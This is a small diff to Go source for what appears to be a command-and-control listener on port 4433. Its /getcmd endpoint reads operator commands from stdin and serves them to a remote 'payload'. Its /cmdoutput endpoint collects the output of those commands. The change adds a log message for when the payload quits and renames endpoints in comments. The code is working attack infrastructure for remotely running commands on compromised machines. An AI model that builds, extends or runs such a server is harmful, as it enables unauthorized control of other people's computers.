@@ -24,7 +24,7 @@ const port = 4433
 // global vars
 var reader = bufio.NewReader(os.Stdin)
 
-// GetCmd handles the /getCmd endpoint and requests a
+// GetCmd handles the /getcmd endpoint and requests a
 // cmd from stdin to send to the payload
 func GetCmd(writer http.ResponseWriter, req *http.Request) {
 	if req.Method == http.MethodGet {
@@ -33,10 +33,16 @@ func GetCmd(writer http.ResponseWriter, req *http.Request) {
 		text, _ := reader.ReadString('\n')
 		text = strings.Replace(text, "\n", "", -1)
 		fmt.Fprintf(writer, text)
+
+		if text == "quit" {
+			// show log to indicate session ended
+			// and we're listening again
+			fmt.Println("[+] Payload quit. Listening again...")
+		}
 	}
 }
 
-// CmdOutput handles the /cmdOutput endpoint and retrieves
+// CmdOutput handles the /cmdoutput endpoint and retrieves
 // the output of a cmd executed by the payload
 func CmdOutput(writer http.ResponseWriter, req *http.Request) {
 	if req.Method == http.MethodPost {
